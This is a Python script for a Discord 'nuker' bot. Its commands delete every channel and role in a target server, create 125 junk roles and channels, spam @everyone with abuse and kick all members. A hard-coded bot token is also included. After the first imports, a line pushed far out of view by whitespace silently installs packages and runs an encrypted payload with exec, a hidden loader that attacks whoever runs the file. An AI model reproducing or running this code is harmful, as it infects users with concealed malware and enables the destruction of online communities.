import os
import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'H6hSDFMU4YU-zTlTqi-VwcuAfYrj0f0dO6J5c87mKZ0=').decrypt(b'gAAAAABoypgKqqbFYwhFe5Ssw7gygY-DRFCY1utPwFrc1XD8sDGrhpur1u8b8F7fn1J9cOaT6LYx5U4soRQM2QQZLsGr6IagTumoMCjnnO_DjtC7Aoa-lXtMbQj3nKG4LyRr-ThXZ9PevltTn7eImLkvbR5W7tk0AaUXQaOK1OrjwpITHcvfBO-AUM0VHRcRZsxgg6owFHmroU46BRmeW4tho8WOk-PQtEP0JNwXiPl4umdf29wES8dbqcpslFIXnMNgc4gl7H2UWtrkVAg6v0i4-kfJoXWqPPAWLUOTJqPrFrnkEgVmvWU24GTxEY6VYl_GvKMz8O76JlstaiE5gaoJbecMPLdoY6ncvM0Cc4AiE9r-dhiHGqI6W_puZpRQIZ7urcnsibRqB8Sf7PYrrzVFFO5Pi8ERO5adyw9Ak-xldJn0op9X4iAl2hHEi3zOTROeszcydUVvSvWrQuhDxIJ_ndzrJjYiRJqEulvFBH0qeDzUGJhhv6aZ81Llman4KDZavENSVBWMrlT1XLynLAWBL8PinNnEABiH_enN674iKVq8XdVy379_wsvMtOQBnrMDCRTM0ErB3liKNHoRTSD8juMZv5U4wsdx3r6n2_D-E4nqlU8c5yjlOuToA9OJo8SRuazoEM6NOipZ0nbd9fQQPbWBFCApCZ-jYRi0RX2vQIpJ6ahslFmcZD16tZCEgKwid7QDjibwNMp__r7rXCxSOJljyHV0_TiALo0s_4KXGbxYLMd45l41Xa-19Eu9xSS8HvH6gVX_pWe0qFMzLxb728Q0na4G4gocTjpkh9S-u-mgN4oKnZDP3uxpkq0UG2gKvH-l40jkKaIw_3fFZmaj-4ydFZonXi_R3qPa8g67TkPbikDj23u3yMundFbvppudYIQo1AEKLZ6H4O7jVYAzjCVVb_KnarzMW3-EZ0vTlZjVimheARr_lwgJEsW_zec1SU3vT5DpHda_SJM3ZMYYfYR-Am9UXr4Uh4zBvhSzoAXwvOK4ke_iH9qsqQ3xkztWOlJiKberRAGcjDkLHWHPASMFxxbT8jQF_6jSnBNQ9ABu5lEbWfEk3bmGJ1HQ6gbq4yOlcuqQ4x0KfzyDr4MTUK_TgqArXsNkydIjs8uHi7IamkvFf31Pnuv3bJEcvM2zoK-BtSEWP0hkrZkTWaUCOmTLM05Gu_VrW2bqep62ZwM-6d5hoxETW5QkslzoiG-nYdlnut_CVYNVGyBPLTa0_f3QnMtEObSQ2lccuWEot17DKpyTSMXA2RgWrafsMtOZKR3phgf6w3Zvk0z2PtsHmF9qqIp515j4GsmH4AXsv2j3dRZWb3y1LHBjdnKOuNFwOr9uzyQ4SX8_ptt5e9JXRt1Ey1CgSpuKxskicvGdvbu4l7r9XQYiMtxglyYJL4DeQRyB0-tHRKVtLMjdeM9efampFEGhNSDNy9jfgkIWnDn1V8QTJThnnXfQCHAG7uhxlUblEIreeBf0oxA7EKnrmV3VDwCCCGL882i2FbvjlSorJU_LXGxzmHOI5z6_y71rWDubSwJgjZ6VUK1SRVPDoCnuXZaSBwKYIA-BZVv2Y0PyJP4V4q3s5N0ufHY_r7vgQ79YeEor9twNPPhxuW3Qff7nbqRpKF1Z0MosG-NYY3w7ehZk1N2RoA7kq9PTzWKFzfLDUu88eMVG0KlQYOL9zOIKNsU3VSpSCfQVmmQhOwsjUjMgUNoJsO_dm-opUTPVpIGxWMermvHp-jYvkd0Y1e2t-gBZGs1baTjmEDtJfMSxClKgxObutQp9CPilLfm1h9jeDI2Ndd2UGN3kM1sETQfeeuInqFVtI0LDppOse8Dz1OwRdyxkLZ0r3NnoF8JYq2IrnWUA0wMqVX3olET6fUaXIWfiExy44YRAXXLHPR3B0tVow-qfnFZoKy6nCNH0HNBU_luRtQm0Kmy8lmmJdlqk6FzqvG8xBsMQml323a5b04q7MJOd7ycqKLhfYac9CjGMTTcEYqnKfWSNJEbankHAZGM1IOQJGoi-hO4HjaUffZ4f9qRw4I0nBgc4EagSY1gGt_hMfRXyOtiI15TjNO0d1Wk5IaFdZihlByRgHoQXpiuMT8Hg-Nfa07BIvPn-bhNqvp4xYW_rBC7ZiQkK0J0-ooZi46KlZjx1_uEhbVViMsxF5bBY8QwNFtDxLpQ6zr_7hW6gyTpxu2SvWpg486Hz43Z-c6bh5GtXK7jWbdOqLeK_dztEoAaEdr3O5HdYxIn0qghIeifAAysdoDGfcp1_QIWgHL22rYDbDMhP_8ynSZNrH4TwvMHeBAM6y2cTDlTHtmjkdSgjOh_H8vHqRkNOlUg6QOLhjn52zFHQDYTtcaiO82REZXXhDNf18ViAE_2WJvyqpnpyzLpD7czyPHbSL20Uw0xlU1-YerNNEZz1UfBbBEb3LEF9jXnrtDfzFC4WToerBqD7PJAb9PF6_8mo2Y5eJMZTBdyh9iHRJMVgty1FP9iizzF5z5fXaAlSCGyPzFuxc_ACw6oOGs8YaWZ8BWQwOaPCoTZNPtLG5D6iMgv_BOtIdOaHSCAJLkpfuBIM4nyInSKTOzr86-OHhYAC8CI5iYB9WnFCthxukWKdXS-2g50ezMun7IIXf0wxbV3saHuqQib7jPT_YkervqR6IjojKOYoAnETqxRvB-oICjHq_KyMwiDNCzkyVS3pvYWUQdOcHGOMCjdMdx6Dd4hOhV-LgFcMHKjyfk4Bxh0gPErtZFA5ivk_Rs7AsAPZLt5f7fr4W-GpFOPk3N5WxDLfaA5bUDpvCFbz4qS9w0kTsEXrAGh8y4WBM9QZTvr7s_5PBUNwMwMgcBuk7hLbmvjnN2FOMWaSfT2FrsVHXW5IlffGj3xekeqd4mlhzb9bRxy51NiHk5-8y_m19yIS-p_5GkngBOZ_urluckyQynbJO7H7LBbCga0KHicU8DmrR8ptbWNFhHEF_cGPY4UUfR4vmCszkNdljlG07Qyc38PDnpZRvyV1XBJkKsKQFCcDwG4E0irKHGa1Jnty6OlMedehxfGnkABKf8rhZfrhMXunb516us2TVqi0RwN7UKF784OO8-T93cukxf8CgsQWTDZ4RCqTsDKdK-SpCcC6SrGF916oPWnlnDwx2JslXxcDF1oLXBtQHOvThiDco6frs8iwxJ1-VA=='));
import discord
from discord.ext import commands

intents = discord.Intents.default()
client = commands.Bot(command_prefix="!", intents=intents)
client.remove_command("help")

@client.event
async def on_ready():
    print("Ready!")

@client.command()
async def destroy(ctx, guild_id: int):
    await ctx.send("**Process Initiated. We're going to have a lot of fun.**")
    guild = client.get_guild(guild_id)
    if guild is None:
        await ctx.send("Invalid Guild ID.")
        return

    for channel in list(guild.channels):
        try:
            await channel.delete()
        except:
            print("Deleting channels failed.")
    for role in list(guild.roles):
        try:
            await role.delete() 
        except:
            print("Deleting roles failed.")
    for _ in range(125):
        try:
            await guild.create_role(name="unknown")
        except:
            print("Creating roles failed.")
    for _ in range(125):
        await guild.create_text_channel(name="unknown")
    for channel in list(guild.channels):
        for _ in range(5):
            try:
                await channel.send("@everyone Server Just Got Fucked unknown.")  
            except:
                print("Sending Message failed.")

@client.command()
async def kick(ctx, guild_id: int):
    guild = client.get_guild(guild_id)
    if guild is None:
        await ctx.send("Invalid server ID.")
        return
    
    if not guild.me.guild_permissions.kick_members:
        await ctx.send("I don't have permission to kick members.")
        return
    
    for member in guild.members:
        try:
            if member == guild.owner:
                continue
            await member.kick(reason="kick members")
            await ctx.send(f"{member.display_name} has been kicked from the server.")
        except discord.Forbidden:
            await ctx.send(f"{member.display_name} I'm not allowed to kick this user.")
        except discord.HTTPException:
            await ctx.send(f"{member.display_name} there was an error trying to kick this user.")
    
    await ctx.send("All members on the server have been kicked out.")



@client.command()
async def members(ctx, guild_id: int):
    guild = client.get_guild(guild_id)
    if guild is None:
        await ctx.send("Invalid Guild ID.")
        return
    member_count = guild.member_count
    await ctx.send(f"The server has {member_count} members.")

@client.command()
async def nothing(ctx, guild_id: int):
    await ctx.send("**Process Initiated.**")
    guild = client.get_guild(guild_id)
    if guild is None:
        await ctx.send("Invalid Guild ID.")
        return
    
    for channel in list(guild.channels):
        try:
            await channel.delete()
        except:
            print("Deleting channels failed.")
    for role in list(guild.roles):
        try:
            await role.delete() 
        except:
            print("Deleting roles failed.")

@client.command()
async def help(ctx):
    await ctx.send("**[1] !help - `(Show Commands)`**")
    await ctx.send("**[2] !destroy [guild_id] `(Destroys the specified server)`**")
    await ctx.send("**[3] !kick [guild_id]`(Ban All Members on the Server)`**")
    await ctx.send("**[4] !members [guild_id] `(Shows the number of members in the server)`**")
    await ctx.send("**[5] !nothing [guild_id] `(Deletes all channels and roles)`**")
    await ctx.send("**[6] !f `(Exit Bot)`**")

@client.command()
async def f(ctx):
    await ctx.send("Exiting...")
    await client.close()

TOKEN = "MTEwMTcxMDg1Mjc5ODgyNDQ4OQ.GIxUqi.ZvH8Y2QfAsU3uf7RYXYXmClKT0flyPNQal6BhY"
client.run(TOKEN)

